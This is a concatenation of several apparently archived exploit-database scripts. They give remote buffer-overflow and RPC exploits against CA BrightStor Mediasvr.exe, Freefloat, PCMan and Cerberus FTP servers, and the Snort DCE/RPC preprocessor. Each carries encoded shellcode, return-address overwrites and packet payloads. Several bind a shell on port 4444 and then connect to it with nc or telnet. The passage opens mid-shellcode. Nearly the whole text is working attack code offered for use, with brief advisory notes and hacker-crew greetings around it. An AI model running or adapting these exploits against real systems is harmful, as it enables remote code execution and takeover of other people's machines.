shellcode += "\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
shellcode += "\x46\x4f\x4b\x53\x46\x35\x46\x52\x4a\x42\x45\x57\x45\x4e\x4b\x48"
shellcode += "\x4f\x45\x46\x52\x41\x30\x4b\x4e\x48\x46\x4b\x38\x4e\x50\x4b\x54"
shellcode += "\x4b\x48\x4f\x45\x4e\x41\x41\x30\x4b\x4e\x43\x30\x4e\x32\x4b\x58"
shellcode += "\x49\x48\x4e\x36\x46\x42\x4e\x41\x41\x56\x43\x4c\x41\x53\x4b\x4d"
shellcode += "\x46\x56\x4b\x38\x43\x54\x42\x43\x4b\x58\x42\x44\x4e\x30\x4b\x38"
shellcode += "\x42\x47\x4e\x41\x4d\x4a\x4b\x58\x42\x44\x4a\x30\x50\x55\x4a\x56"
shellcode += "\x50\x48\x50\x34\x50\x30\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x36"
shellcode += "\x43\x45\x48\x56\x4a\x46\x43\x53\x44\x33\x4a\x46\x47\x37\x43\x57"
shellcode += "\x44\x33\x4f\x35\x46\x35\x4f\x4f\x42\x4d\x4a\x36\x4b\x4c\x4d\x4e"
shellcode += "\x4e\x4f\x4b\x53\x42\x45\x4f\x4f\x48\x4d\x4f\x35\x49\x38\x45\x4e"
shellcode += "\x48\x46\x41\x58\x4d\x4e\x4a\x30\x44\x30\x45\x35\x4c\x36\x44\x30"
shellcode += "\x4f\x4f\x42\x4d\x4a\x46\x49\x4d\x49\x50\x45\x4f\x4d\x4a\x47\x35"
shellcode += "\x4f\x4f\x48\x4d\x43\x35\x43\x45\x43\x55\x43\x45\x43\x35\x43\x34"
shellcode += "\x43\x55\x43\x34\x43\x45\x4f\x4f\x42\x4d\x48\x46\x4a\x36\x41\x41"
shellcode += "\x4e\x45\x48\x36\x43\x45\x49\x58\x41\x4e\x45\x39\x4a\x56\x46\x4a"
shellcode += "\x4c\x31\x42\x37\x47\x4c\x47\x45\x4f\x4f\x48\x4d\x4c\x46\x42\x31"
shellcode += "\x41\x55\x45\x55\x4f\x4f\x42\x4d\x4a\x36\x46\x4a\x4d\x4a\x50\x42"
shellcode += "\x49\x4e\x47\x45\x4f\x4f\x48\x4d\x43\x55\x45\x35\x4f\x4f\x42\x4d"
shellcode += "\x4a\x36\x45\x4e\x49\x54\x48\x58\x49\x44\x47\x55\x4f\x4f\x48\x4d"
shellcode += "\x42\x55\x46\x35\x46\x35\x45\x35\x4f\x4f\x42\x4d\x43\x39\x4a\x56"
shellcode += "\x47\x4e\x49\x47\x48\x4c\x49\x37\x47\x45\x4f\x4f\x48\x4d\x45\x45"
shellcode += "\x4f\x4f\x42\x4d\x48\x46\x4c\x36\x46\x56\x48\x36\x4a\x46\x43\x46"
shellcode += "\x4d\x46\x49\x58\x45\x4e\x4c\x56\x42\x35\x49\x55\x49\x52\x4e\x4c"
shellcode += "\x49\x38\x47\x4e\x4c\x56\x46\x54\x49\x58\x44\x4e\x41\x53\x42\x4c"
shellcode += "\x43\x4f\x4c\x4a\x50\x4f\x44\x54\x4d\x52\x50\x4f\x44\x34\x4e\x32"
shellcode += "\x43\x49\x4d\x48\x4c\x47\x4a\x33\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x36"
shellcode += "\x44\x47\x50\x4f\x43\x4b\x48\x41\x4f\x4f\x45\x57\x46\x34\x4f\x4f"
shellcode += "\x48\x4d\x4b\x45\x47\x55\x44\x55\x41\x45\x41\x35\x41\x55\x4c\x36"
shellcode += "\x41\x30\x41\x35\x41\x55\x45\x45\x41\x45\x4f\x4f\x42\x4d\x4a\x56"
shellcode += "\x4d\x4a\x49\x4d\x45\x30\x50\x4c\x43\x35\x4f\x4f\x48\x4d\x4c\x56"
shellcode += "\x4f\x4f\x4f\x4f\x47\x33\x4f\x4f\x42\x4d\x4b\x38\x47\x55\x4e\x4f"
shellcode += "\x43\x48\x46\x4c\x46\x36\x4f\x4f\x48\x4d\x44\x55\x4f\x4f\x42\x4d"
shellcode += "\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x43\x55\x4f\x4f\x48\x4d"
shellcode += "\x4f\x4f\x42\x4d\x5a\x90"

#------------------------------------------------------------------------

#First Packet
rpc_packet1="\x80\x00\x80\x34\x65\xcf\x4c\x7b\x00\x00\x00\x00\x00\x00\x00"
rpc_packet1+="\x02\x00\x06\x09\x7e\x00\x00\x00\x01"

#Prodcedure 191 and nulls
rpc_packet1+="\x00\x00\x00\xbf\x00\x00\x00\x00\x00\x00\x00\x00"

#Apparently these 4 bytes can be anything
rpc_packet1+="\x00\x00\x00\x00"

#This value is important for the location of the next address
rpc_packet1+="\x00\x00\x00\x00"

#Hardcoded Address loaded into ECX
rpc_packet1+="\x00\xae\x27\x64"

#Just spacing
rpc_packet1+="\x41\x42\x43\x44"

#Addess in memory, loaded into EAX and called with EAX+2Ch to get to shellcode
rpc_packet1+="\x3c\x27\xae\x00"

#jump to shellcode for packet 1
rpc_packet1+="\x6c\x27\xae\x00"
rpc_packet1+="\xeb\x01"
rpc_packet1+=shellcode

#------------------------------------------------------------------------

#Second Packet
rpc_packet2="\x80\x00\x80\x34\x65\xcf\x4c\x7b\x00\x00\x00\x00\x00\x00\x00"
rpc_packet2+="\x02\x00\x06\x09\x7e\x00\x00\x00\x01"

#Procedure 191 and nulls
rpc_packet2+="\x00\x00\x00\xbf\x00\x00\x00\x00\x00\x00\x00\x00"

#Apparently these 4 bytes can be anything
rpc_packet2+="\x00\x00\x00\x00"

#This value is important for the location of the next address
rpc_packet2+="\x00\x00\x00\x00"

#Hardcoded Address loaded into ECX that seems to be hit after Mediasvr.exe has been
#restarted
rpc_packet2+="\x00\x9e\x27\x64"

#Just spacing
rpc_packet2+="\x41\x42\x43\x44"

#Addess stored in memory, loaded into EAX and called with EAX+2Ch to get to shellcode
rpc_packet2+="\x3c\x27\x9e\x00"

#jump to shellcode for packet 2
rpc_packet2+="\x6c\x27\x9e\x00"
rpc_packet2+="\xeb\x01"
rpc_packet2+=shellcode

# Portmap request for Mediasvr.exe
rpc_portmap_req="\x80\x00\x00\x38\x21\x84\xf7\xc9\x00\x00\x00\x00\x00\x00\x00"
rpc_portmap_req+="\x02\x00\x01\x86\xa0\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00"
rpc_portmap_req+="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
rpc_portmap_req+="\x06\x09\x7e\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x00"

#------------------------------------------------------------------------

def GetMediaSvrPort(target):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((target,111))
    sock.send(rpc_portmap_req)
    rec = sock.recv(256)
    sock.close()

    port1 = rec[-4]
    port2 = rec[-3]
    port3 = rec[-2]
    port4 = rec[-1]   
   
    port1 = hex(ord(port1))
    port2 = hex(ord(port2))
    port3 = hex(ord(port3))
    port4 = hex(ord(port4))
    port = '%02x%02x%02x%02x' % (int(port1,16),int(port2,16),int(port3,16),int(port4,16))
   
    port = int(port,16)
    if port < 1100:
        print '[+] Fresh Meat: Mediasvr.exe has not been restarted, Sending Packet 1 to: Target: %s Port: %s' %(target,port)
        ExploitMediaSvr(target,port,1)
    else:
        print '[+] Mediasvr.exe has been restarted, Sending Packet 2 to: Target: %s Port: %s' % (target,port)
        ExploitMediaSvr(target,port,2)

def ExploitMediaSvr(target,port,p):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, port))
    if p == 1:
        sock.send(rpc_packet1)    
    elif p == 2:
        sock.send(rpc_packet2)
       sock.close ()


if __name__=="__main__":
       try:
               target = sys.argv[1]
       except IndexError:
        print '[+] Computer Associates (CA) Brightstor Backup Mediasvr.exe Remote Exploit'
               print '[+] Author: Shirkdog'
                   print '[+] Usage: %s <target ip>\n' % sys.argv[0]
                   sys.exit(-1)

       print '[+] Computer Associates (CA) Brightstor Backup Mediasvr.exe Remote Exploit'
       print '[+] Author: Shirkdog'

       GetMediaSvrPort(target)
           
       print '[+] Exploit sent. Using nc to connect to: %s on port 4444' % target
       time.sleep(3)
       connect = "/usr/bin/nc -vn " + target + " 4444"
       os.system(connect)

# milw0rm.com [2007-03-29]
source: http://www.securityfocus.com/bid/49265/info

Freefloat FTP Server is prone to a buffer-overflow vulnerability.

An attacker can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition. 

import socket
import sys

def usage():

        print "usage  : ./freefloatftp.py <victim_ip>  <victim_port>"
        print "example: ./freefloatftp.py 192.168.1.100 21"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


print "\n"	
print "#############################################################################"
print "#      Freefloat FTP Server ALLO Buffer Overflow Vulnerability Exploit      #"
print "#############################################################################"
print "\n"


if len(sys.argv) != 3:
	usage()
        sys.exit()

ip   = sys.argv[1]
port = sys.argv[2]

junk1= "\x41" * 246
ret  = "\xED\x1E\x94\x7C" #7C941EED JMP ESP
nop  = "\x90"* 200
# windows/exec          CMD=calc.exe
shellcode =("\x89\xe3\xdb\xd4\xd9\x73\xf4\x5d\x55\x59\x49\x49\x49\x49"
			"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51"
			"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32"
			"\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
			"\x42\x75\x4a\x49\x4d\x6f\x58\x70\x56\x4f\x54\x70\x4d\x6e"
			"\x58\x59\x58\x4b\x54\x69\x5a\x69\x4d\x61\x56\x53\x4b\x69"
			"\x52\x54\x45\x74\x4b\x44\x43\x6a\x45\x61\x50\x7a\x45\x42"
			"\x4d\x53\x58\x42\x54\x44\x43\x33\x4d\x5a\x45\x71\x58\x52"
			"\x50\x4b\x4d\x46\x5a\x76\x4d\x4b\x4c\x74\x43\x56\x45\x77"
			"\x49\x6c\x45\x6d\x4c\x43\x56\x76\x54\x6e\x56\x39\x4b\x70"
			"\x54\x4b\x4b\x4e\x51\x39\x4d\x54\x4d\x77\x51\x65\x51\x6f"
			"\x45\x6c\x54\x73\x49\x6b\x4d\x78\x45\x63\x4c\x34\x58\x36"
			"\x4e\x6e\x50\x7a\x47\x75\x54\x37\x56\x6f\x58\x50\x4b\x75"
			"\x47\x69\x49\x63\x47\x5a\x54\x5a\x4b\x4a\x5a\x6a\x4b\x55"
			"\x50\x6f\x4b\x4b\x54\x4b\x45\x4b\x4d\x4f\x4d\x79\x58\x44"
			"\x56\x30\x54\x72\x51\x4e\x51\x70\x47\x54\x4e\x6f\x43\x6f"
			"\x4e\x46\x51\x33\x4c\x6f\x56\x47\x5a\x63\x5a\x53\x43\x74"
			"\x5a\x32\x49\x5a\x45\x73\x58\x74\x4e\x49\x4e\x65\x4b\x6b"
			"\x51\x6e\x49\x65\x50\x35\x49\x4a\x51\x43\x5a\x45\x56\x6a"
			"\x4d\x45\x4e\x38\x49\x4e\x49\x69\x56\x44\x54\x49\x54\x6f"
			"\x47\x71\x52\x37\x50\x75\x49\x6c\x47\x4c\x4e\x78\x50\x78"
			"\x4b\x4c\x52\x59\x47\x6e\x45\x33\x4c\x4b\x52\x51\x51\x4d"
			"\x47\x6e\x4e\x6c\x43\x71\x47\x6c\x4f\x34\x56\x79\x43\x64"
			"\x4c\x46\x4e\x6f\x4f\x4a\x4d\x6c\x56\x57\x47\x33\x43\x6c"
			"\x47\x46\x47\x4b\x47\x58\x45\x7a\x54\x50\x43\x6f\x4e\x4f"
			"\x4b\x4f\x54\x6a\x51\x4b\x54\x64\x49\x6e\x4b\x4c\x5a\x4a"
			"\x51\x6e\x56\x45\x4e\x39\x4c\x77\x54\x65\x43\x74\x54\x38"
			"\x47\x6d\x4c\x4b\x50\x79\x4c\x5a\x58\x79\x50\x74\x4b\x6c"
			"\x4e\x30\x5a\x4b\x51\x71\x52\x46\x4d\x6b\x45\x31\x51\x67"
			"\x58\x6a\x4b\x71\x5a\x6c\x52\x57\x4b\x44\x4b\x79\x51\x6e"
			"\x54\x50\x4f\x35\x43\x72\x56\x71\x50\x67\x5a\x7a\x4b\x30"
			"\x50\x56\x4f\x67\x4e\x70\x4b\x39\x49\x6e\x50\x30\x43\x4d"
			"\x51\x48\x52\x63\x51\x4d\x51\x6e\x58\x36\x4b\x37\x56\x38"
			"\x49\x6d\x54\x73\x52\x57\x4f\x6f\x47\x6d\x45\x66\x51\x62"
			"\x4b\x6b\x4c\x59\x4f\x5a\x54\x4e\x54\x34\x52\x6c\x58\x4d"
			"\x4d\x6d\x50\x75\x51\x55\x4c\x6e\x45\x70\x58\x66\x54\x45"
			"\x47\x6f\x5a\x67\x4c\x4e\x4e\x4c\x51\x4f\x41\x41")


buff   = junk1 + ret + nop + shellcode

try:
	print("[-] Connecting to " + ip + " on port " + port + "\n")
	s.connect((ip,int(port)))
	data = s.recv(1024)
	print("[-] Sending exploit...")
	s.send("USER test\r\n")
	s.recv(1024)
	s.send("PASS test\r\n")
	s.recv(1024)
	s.send("ALLO "+buff+"\r\n")
	s.close()
	print("[-] Exploit successfully sent...")
except:
	print("[-] Connection error...")
	print("[-] Check if victim is up.")# Title: PCMan FTP Server v2.0.7 Buffer Overflow - MKD Command
# Date : 12/02/2015 
# Author: R-73eN
# Software: PCMan FTP Server v2.0.7
# Tested On Windows Xp SP3

import socket

#348 Bytes Bind Shell Port TCP/4444
shellcode = "\xdb\xcc\xba\x40\xb6\x7d\xba\xd9\x74\x24\xf4\x58\x29\xc9"
shellcode += "\xb1\x50\x31\x50\x18\x03\x50\x18\x83\xe8\xbc\x54\x88\x46"
shellcode += "\x56\x72\x3e\x5f\x5f\x7b\x3e\x60\xff\x0f\xad\xbb\xdb\x84"
shellcode += "\x6b\xf8\xa8\xe7\x76\x78\xaf\xf8\xf2\x37\xb7\x8d\x5a\xe8"
shellcode += "\xc6\x7a\x2d\x63\xfc\xf7\xaf\x9d\xcd\xc7\x29\xcd\xa9\x08"
shellcode += "\x3d\x09\x70\x42\xb3\x14\xb0\xb8\x38\x2d\x60\x1b\xe9\x27"
shellcode += "\x6d\xe8\xb6\xe3\x6c\x04\x2e\x67\x62\x91\x24\x28\x66\x24"
shellcode += "\xd0\xd4\xba\xad\xaf\xb7\xe6\xad\xce\x84\xd7\x16\x74\x80"
shellcode += "\x54\x99\xfe\xd6\x56\x52\x70\xcb\xcb\xef\x31\xfb\x4d\x98"
shellcode += "\x3f\xb5\x7f\xb4\x10\xb5\xa9\x22\xc2\x2f\x3d\x98\xd6\xc7"
shellcode += "\xca\xad\x24\x47\x60\xad\x99\x1f\x43\xbc\xe6\xdb\x03\xc0"
shellcode += "\xc1\x43\x2a\xdb\x88\xfa\xc1\x2c\x57\xa8\x73\x2f\xa8\x82"
shellcode += "\xeb\xf6\x5f\xd6\x46\x5f\x9f\xce\xcb\x33\x0c\xbc\xb8\xf0"
shellcode += "\xe1\x01\x6d\x08\xd5\xe0\xf9\xe7\x8a\x8a\xaa\x8e\xd2\xc6"
shellcode += "\x24\x35\x0e\x99\x73\x62\xd0\x8f\x11\x9d\x7f\x65\x1a\x4d"
shellcode += "\x17\x21\x49\x40\x01\x7e\x6e\x4b\x82\xd4\x6f\xa4\x4d\x32"
shellcode += "\xc6\xc3\xc7\xeb\x27\x1d\x87\x47\x83\xf7\xd7\xb8\xb8\x90"
shellcode += "\xc0\x40\x78\x19\x58\x4c\x52\x8f\x99\x62\x3c\x5a\x02\xe5"
shellcode += "\xa8\xf9\xa7\x60\xcd\x94\x67\x2a\x24\xa5\x01\x2b\x5c\x71"
shellcode += "\x9b\x56\x91\xb9\x68\x3c\x2f\x7b\xa2\xbf\x8d\x50\x2f\xb2"
shellcode += "\x6b\x91\xe4\x66\x20\x89\x88\x86\x85\x5c\x92\x02\xad\x9f"
shellcode += "\xba\xb6\x7a\x32\x12\x18\xd5\xd8\x95\xcb\x84\x49\xc7\x14"
shellcode += "\xf6\x1a\x4a\x33\xf3\x14\xc7\x3b\x2d\xc2\x17\x3c\xe6\xec"
shellcode += "\x38\x48\x5f\xef\x3a\x8b\x3b\xf0\xeb\x46\x3c\xde\x7c\x88"
shellcode += "\x0c\x3f\x1c\x05\x6f\x16\x22\x79"
banner = ""
banner += "  ___        __        ____                 _    _  \n"   
banner +=" |_ _|_ __  / _| ___  / ___| ___ _ __      / \  | |    \n"
banner +="  | || '_ \| |_ / _ \| |  _ / _ \ '_ \    / _ \ | |    \n"
banner +="  | || | | |  _| (_) | |_| |  __/ | | |  / ___ \| |___ \n"
banner +=" |___|_| |_|_|  \___/ \____|\___|_| |_| /_/   \_\_____|\n\n"
print banner
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server = raw_input('Enter IP : ')
s.connect((server, 21))
a = s.recv(1024)
print ' [+] ' + a
s.send('User anonymous')
s.recv(1024)
s.send('pass')
s.recv(1024)
print ' [+] Logged in as Anonymous ...'
evil = 'A' * 2007 #JUNK
evil += '\x65\x82\xA5\x7C' # EIP overwrite jmp esp / shell32.dll
evil += '\x90' * 10
evil += shellcode
print ' [+] Sending Payload ...'
s.send('mkd ' + evil)
print ' [+] You got shell .....\n telnet ' + server + ' 4444'
#!/usr/bin/python
#
# Remote exploit for Snort DCE/RPC preprocessor vulnerability as described in
# CVE-2006-5276. The exploit binds a shell to TCP port 4444 and connects to it.
# This code was tested against snort-2.6.1 running on Red Hat Linux 8
#
# Author shall bear no responsibility for any screw ups caused by using this code
# Winny Thomas :-)

import os
import sys
import time
from scapy import *

# Linux portbind shellcode; Binds shell on TCP port 4444
shellcode  = "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96"
shellcode += "\x43\x52\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56"
shellcode += "\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1"
shellcode += "\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"
shellcode += "\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
shellcode += "\x89\xe1\xcd\x80"

def ExploitSnort(target):
       # SMB packet borrowed from http://www.milw0rm.com/exploits/3391
       # NetBIOS Session Service
       smbreq = "\x00\x00\x02\xab"

       # SMB Header
       smbreq += "\xff\x53\x4d\x42\x75\x00\x00\x00\x00\x18\x07\xc8\x00\x00"
       smbreq += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe"
       smbreq += "\x00\x08\x30\x00"

       # Tree Connect AndX Request
       smbreq += "\x04\xa2\x00\x52\x00\x08\x00\x01\x00\x27\x00\x00"
       smbreq += "\x5c\x00\x5c\x00\x49\x00\x4e\x00\x53\x00\x2d\x00\x4b\x00\x49\x00"
       smbreq += "\x52\x00\x41\x00\x5c\x00\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00"
       smbreq += "\x3f\x3f\x3f\x3f\x3f\x00"

       # NT Create AndX Request
       smbreq += "\x18\x2f\x00\x96\x00\x00\x0e\x00\x16\x00\x00\x00\x00\x00\x00\x00"
       smbreq += "\x9f\x01\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
       smbreq += "\x03\x00\x00\x00\x01\x00\x00\x00\x40\x00\x40\x00\x02\x00\x00\x00"
       smbreq += "\x01\x11\x00\x00\x5c\x00\x73\x00\x72\x00\x76\x00\x73\x00\x76\x00"
       smbreq += "\x63\x00\x00\x00"

       # Write AndX Request #1
       smbreq += "\x0e\x2f\x00\xfe\x00\x00\x40\x00\x00\x00\x00\xff\xff\xff\xff\x80"
       smbreq += "\x00\x48\x00\x00\x00\x48\x00\xb6\x00\x00\x00\x00\x00\x49\x00\xee"
       smbreq += "\x05\x00\x0b\x03\x10\x00\x00\x00\x10\x02\x00\x00\x01\x00\x00\x00"
       smbreq += "\xb8\x10\xb8\x10\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
       smbreq += "\xc8\x4f\x32\x4b\x70\x16\xd3\x01\x12\x78\x5a\x47\xbf\x6e\xe1\x88"
       smbreq += "\x03\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
       smbreq += "\x2b\x10\x48\x60\x02\x00\x00\x00"

       # Write AndX Request #2
       smbreq += "\x0e\xff\x00\xde\xde\x00\x40\x00\x00\x00\x00\xff\xff\xff\xff\x80"
       smbreq += "\x00\x48\x00\x00\x00\xff\x01\xce\x01\x00\x00\x00\x00\x49\x00\xee"
       smbreq += "\xed\x1e\x94\x7c\x90\x81\xc4\xff\xef\xff\xff\x44"
       smbreq += "\x31\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xa9"
       # The following address overwrites RET and points into our shellcode
       smbreq += struct.pack('<L', 0xbfffeff0)
       smbreq += '\x90' * 50
       smbreq += shellcode
       smbreq += '\x90' * 130

       packet = IP(dst=target) / TCP(sport=1025, dport=139, flags="PA") / smbreq
       send(packet)

def ConnectRemoteShell(target):
       connect = '/usr/bin/telnet ' + target + ' 4444'
       os.system(connect)

if __name__ == '__main__':
       try:
               target = sys.argv[1]
       except IndexError:
               print 'Usage: %s <ip of a host on snort network>' % sys.argv[0]
               sys.exit(-1)

       print '[+] Sending malformed SMB packet'
       ExploitSnort(target)
       print '[+] Connecting to remote shell in 3 seconds...'
       time.sleep(3)
       ConnectRemoteShell(target)

# milw0rm.com [2007-03-30]
source: http://www.securityfocus.com/bid/49444/info

Cerberus FTP Server is prone to a remote buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied data.

Attackers can exploit this issue to execute arbitrary code within the context of the application. Failed attacks may cause a denial-of-service condition.

Cerberus FTP Server 4.0.9.8 is vulnerable; other versions may also be affected.

NOTE: The vendor refutes this issue stating the issue can not be replicated as described.

1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : 1337day.com                                   0
1  [+] Support e-mail  : submit[at]1337day.com                         1
0                                                                      0
1               #########################################              1
0               I'm KedAns-Dz member from Inj3ct0r Team                1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

###
# Title : Cerberus FTP Server 4.0.9.8 (REST) Remote BOF and Crash Exploit
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com (ked-h@1337day.com) | ked-h@exploit-id.com | kedans@facebook.com
# Home : Hassi.Messaoud (30008) - Algeria -(00213555248701)
# Web Site : www.1337day.com * www.exploit-id.com * sec4ever.com
# Facebook : http://facebook.com/KedAns
# platform : windows
# Impact : Remote Buffer Overflow ( in REST command)
# Tested on : Windows XP SP3 (en)
##

##
# | >> --------+++=[ Dz Offenders Cr3w ]=+++-------- << |
# | > Indoushka * KedAns-Dz * Caddy-Dz * Kalashinkov3   |
# | Jago-dz * Over-X * Kha&miX * Ev!LsCr!pT_Dz * H-KinG |
# | ------------------------------------------------- < |
###

#=====[ Exploit Code ]======>

#!/usr/bin/python

# Cerberus FTP Server 4.0.9.8 (REST) Remote BOF and Crash Exploit
# Provided by : KedAns-Dz * Inj3ct0r Team

import errno
from os import strerror
from socket import *
import sys
from time import sleep
from struct import pack

if len(sys.argv) != 3:
    print "[*]Usage: python %s <ip> <port>" % sys.argv[0]
    print "[*]Exemple: python %s 192.168.1.2 21" % sys.argv[0]
    sys.exit(0)
ip = sys.argv[1]
port = int(sys.argv[2])

# windows/exec | cmd=calc.exe | x86/alpha_mixed (http://metasploit.com)
shellcode = ("\x56\x54\x58\x36\x33\x30\x56\x58\x48\x34\x39\x48\x48\x48" 
"\x50\x68\x59\x41\x41\x51\x68\x5a\x59\x59\x59\x59\x41\x41" 
"\x51\x51\x44\x44\x44\x64\x33\x36\x46\x46\x46\x46\x54\x58" 
"\x56\x6a\x30\x50\x50\x54\x55\x50\x50\x61\x33\x30\x31\x30" 
"\x38\x39\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49" 
"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41" 
"\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42" 
"\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x49\x6c\x4b" 
"\x58\x4e\x69\x43\x30\x43\x30\x43\x30\x43\x50\x4f\x79\x4b" 
"\x55\x45\x61\x4e\x32\x43\x54\x4c\x4b\x42\x72\x50\x30\x4c" 
"\x4b\x42\x72\x44\x4c\x4e\x6b\x43\x62\x42\x34\x4c\x4b\x43" 
"\x42\x45\x78\x46\x6f\x4d\x67\x51\x5a\x51\x36\x50\x31\x49" 
"\x6f\x50\x31\x4b\x70\x4c\x6c\x45\x6c\x43\x51\x51\x6c\x47" 
"\x72\x46\x4c\x51\x30\x49\x51\x4a\x6f\x46\x6d\x47\x71\x4a" 
"\x67\x4a\x42\x4a\x50\x46\x32\x51\x47\x4c\x4b\x43\x62\x44" 
"\x50\x4e\x6b\x42\x62\x45\x6c\x47\x71\x4e\x30\x4c\x4b\x47" 
"\x30\x50\x78\x4e\x65\x49\x50\x50\x74\x51\x5a\x46\x61\x4e" 
"\x30\x50\x50\x4c\x4b\x51\x58\x45\x48\x4e\x6b\x43\x68\x45" 
"\x70\x47\x71\x4b\x63\x4a\x43\x45\x6c\x47\x39\x4c\x4b\x47" 
"\x44\x4c\x4b\x46\x61\x48\x56\x50\x31\x49\x6f\x46\x51\x4f" 
"\x30\x4e\x4c\x4b\x71\x4a\x6f\x44\x4d\x47\x71\x4a\x67\x44" 
"\x78\x49\x70\x44\x35\x48\x74\x45\x53\x51\x6d\x4a\x58\x45" 
"\x6b\x51\x6d\x44\x64\x44\x35\x48\x62\x51\x48\x4e\x6b\x51" 
"\x48\x47\x54\x43\x31\x4b\x63\x43\x56\x4e\x6b\x46\x6c\x42" 
"\x6b\x4c\x4b\x43\x68\x47\x6c\x46\x61\x4a\x73\x4e\x6b\x43" 
"\x34\x4e\x6b\x47\x71\x48\x50\x4c\x49\x51\x54\x51\x34\x45" 
"\x74\x43\x6b\x43\x6b\x50\x61\x46\x39\x51\x4a\x42\x71\x4b" 
"\x4f\x4d\x30\x50\x58\x51\x4f\x50\x5a\x4e\x6b\x46\x72\x4a" 
"\x4b\x4b\x36\x43\x6d\x51\x7a\x46\x61\x4e\x6d\x4f\x75\x4d" 
"\x69\x43\x30\x47\x70\x45\x50\x50\x50\x42\x48\x44\x71\x4c" 
"\x4b\x50\x6f\x4b\x37\x4b\x4f\x4a\x75\x4f\x4b\x4a\x50\x4d" 
"\x65\x4e\x42\x42\x76\x50\x68\x4e\x46\x4e\x75\x4f\x4d\x4d" 
"\x4d\x4b\x4f\x4e\x35\x47\x4c\x44\x46\x51\x6c\x44\x4a\x4d" 
"\x50\x49\x6b\x49\x70\x42\x55\x46\x65\x4f\x4b\x47\x37\x45" 
"\x43\x51\x62\x50\x6f\x42\x4a\x47\x70\x50\x53\x49\x6f\x49" 
"\x45\x50\x63\x51\x71\x42\x4c\x42\x43\x46\x4e\x50\x65\x51" 
"\x68\x43\x55\x45\x50\x41\x41")
buf = "\x41" * 244
buf += pack('<L',0x7C874413) # jmp esp - from (kernel32.dll)
buf += "\x90" * 50
buf += shellcode

print "[+]Connecting with server..."
sleep(1)
try:
    s = socket(AF_INET,SOCK_STREAM)
    s.connect((ip,port))
    s.recv(1024)
    s.send("USER test\r\n")
    s.recv(1024)
    s.send("PASS test\r\n")
    s.recv(1024)
    s.send("REST "+buf+"\r\n")
    s.close()
    s = socket(AF_INET,SOCK_STREAM)
    s.connect((ip,port))# Connected again to Crash and BOF
    sleep(1)
    s.close()# Close connection and Crash!!!
    print "[+]Exploit sent with sucess"
except:
	print "[-]Error in connection with server: "+ip

#=====[ The End ]=======|

#================[ Exploited By KedAns-Dz * Inj3ct0r Team * ]=====================================
# Greets To : Dz Offenders Cr3w < Algerians HaCkerS > + Rizky Ariestiyansyah * Islam Caddy <3
# + Greets To Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re * CrosS (www.1337day.com) 
# Inj3ct0r Members 31337 : Indoushka * KnocKout * eXeSoul * SeeMe * XroGuE * ZoRLu * gunslinger_ 
# anT!-Tr0J4n * ^Xecuti0N3r * Kalashinkov3 (www.1337day.com/team) * Dz Offenders Cr3w * Sec4ever
# Exploit-ID Team : jos_ali_joe + Caddy-Dz + kaMtiEz + r3m1ck (exploit-id.com) * Jago-dz * Over-X
# Kha&miX * Str0ke * JF * Ev!LsCr!pT_Dz * H-KinG * www.packetstormsecurity.org * TreX (hotturks.org)
